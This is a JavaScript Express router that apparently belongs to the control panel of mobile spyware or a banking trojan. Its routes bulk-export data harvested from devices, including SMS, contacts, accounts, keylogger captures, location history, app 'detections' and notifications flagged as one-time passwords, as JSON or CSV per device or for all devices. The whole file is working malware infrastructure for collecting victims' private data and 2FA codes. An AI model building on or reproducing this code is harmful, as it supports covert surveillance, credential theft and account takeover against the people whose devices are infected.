'use strict';
const router = require('express').Router();
const { all, get } = require('../core/db');

// ── JSON export ────────────────────────────────────────────────────────────────
router.get('/json/:type', async (req, res) => {
  const { type } = req.params;
  const devId    = req.query.dev_id;
  const data     = await fetchData(type, devId);
  if (!data) return res.status(400).json({ error: 'Unknown type' });

  res.setHeader('Content-Type', 'application/json');
  res.setHeader('Content-Disposition', `attachment; filename="${type}-${Date.now()}.json"`);
  res.end(JSON.stringify(data, null, 2));
});

// ── CSV export ────────────────────────────────────────────────────────────────
router.get('/csv/:type', async (req, res) => {
  const { type } = req.params;
  const devId    = req.query.dev_id;
  const data     = await fetchData(type, devId);
  if (!data || !data.length) return res.status(400).json({ error: 'Unknown type or no data' });

  const headers = Object.keys(data[0]).join(',');
  const rows    = data.map(r =>
    Object.values(r).map(v =>
      `"${String(v ?? '').replace(/"/g, '""').replace(/\n/g, ' ')}"`
    ).join(',')
  ).join('\n');

  res.setHeader('Content-Type', 'text/csv');
  res.setHeader('Content-Disposition', `attachment; filename="${type}-${Date.now()}.csv"`);
  res.end(headers + '\n' + rows);
});

// ── Summary export (all types, one JSON) ──────────────────────────────────────
router.get('/full/:dev_id', async (req, res) => {
  const id  = req.params.dev_id;
  const dev = await get(`SELECT * FROM devices WHERE id=?`, [id]);
  if (!dev) return res.status(404).json({ error: 'Device not found' });

  const [sms, contacts, apps, accounts, keylogs, events, location, detections] =
    await Promise.all([
      fetchData('sms',        id),
      fetchData('contacts',   id),
      fetchData('apps',       id),
      fetchData('accounts',   id),
      fetchData('keylogs',    id),
      fetchData('events',     id),
      fetchData('location',   id),
      fetchData('detections', id),
    ]);

  const out = {
    device:     { ...dev, info: tryParse(dev.info, {}) },
    exported_at: new Date().toISOString(),
    sms, contacts, apps, accounts, keylogs, events, location, detections
  };

  res.setHeader('Content-Type', 'application/json');
  res.setHeader('Content-Disposition', `attachment; filename="device-${id.slice(0,8)}-${Date.now()}.json"`);
  res.end(JSON.stringify(out, null, 2));
});

// ── OTP log export ─────────────────────────────────────────────────────────────
router.get('/otp', async (req, res) => {
  const devId = req.query.dev_id;
  let sql = `SELECT n.*, d.alias FROM notifications n
             LEFT JOIN devices d ON d.id=n.dev_id
             WHERE n.is_otp=1`;
  const p = [];
  if (devId) { sql += ' AND n.dev_id=?'; p.push(devId); }
  sql += ' ORDER BY n.ts DESC LIMIT 2000';
  const rows = await all(sql, p);
  res.json(rows);
});

// ── Helpers ────────────────────────────────────────────────────────────────────
async function fetchData(type, devId) {
  const p = devId ? [devId] : [];
  const w = devId ? 'WHERE dev_id=?' : '';
  const w2 = devId ? 'WHERE d.dev_id=?' : '';

  switch (type) {
    case 'sms': {
      if (devId) {
        const r = await get(`SELECT data FROM device_sms WHERE dev_id=?`, [devId]);
        return tryParse(r?.data, []);
      }
      const rows = await all(`SELECT dev_id, ts, data FROM device_sms`);
      return rows.flatMap(r => tryParse(r.data, []).map(s => ({ ...s, dev_id: r.dev_id })));
    }
    case 'contacts': {
      if (devId) {
        const r = await get(`SELECT data FROM device_contacts WHERE dev_id=?`, [devId]);
        return tryParse(r?.data, []);
      }
      const rows = await all(`SELECT dev_id, data FROM device_contacts`);
      return rows.flatMap(r => tryParse(r.data, []).map(c => ({ ...c, dev_id: r.dev_id })));
    }
    case 'apps': {
      if (devId) {
        const r = await get(`SELECT data FROM device_apps WHERE dev_id=?`, [devId]);
        return tryParse(r?.data, []);
      }
      const rows = await all(`SELECT dev_id, data FROM device_apps`);
      return rows.flatMap(r => tryParse(r.data, []).map(a => ({ ...a, dev_id: r.dev_id })));
    }
    case 'accounts': {
      if (devId) {
        const r = await get(`SELECT data FROM device_accounts WHERE dev_id=?`, [devId]);
        return tryParse(r?.data, []);
      }
      const rows = await all(`SELECT dev_id, data FROM device_accounts`);
      return rows.flatMap(r => tryParse(r.data, []).map(a => ({ ...a, dev_id: r.dev_id })));
    }
    case 'keylogs': {
      const sql = `SELECT id,ts,dev_id,app,pkg,text FROM keylogs ${w} ORDER BY ts DESC LIMIT 5000`;
      return all(sql, p);
    }
    case 'events': {
      const rows = await all(`SELECT * FROM events ${w} ORDER BY ts DESC LIMIT 5000`, p);
      return rows.map(r => ({ ...r, data: tryParse(r.data) }));
    }
    case 'location':
      return all(`SELECT * FROM device_location ${w} ORDER BY ts DESC LIMIT 500`, p);
    case 'detections':
      return all(`SELECT * FROM app_detections ${w} ORDER BY ts DESC`, p);
    case 'notifications':
      return all(`SELECT * FROM notifications ${w} ORDER BY ts DESC LIMIT 2000`, p);
    default:
      return null;
  }
}

function tryParse(s, fb = null) {
  try { return JSON.parse(s); } catch { return fb; }
}

module.exports = router;
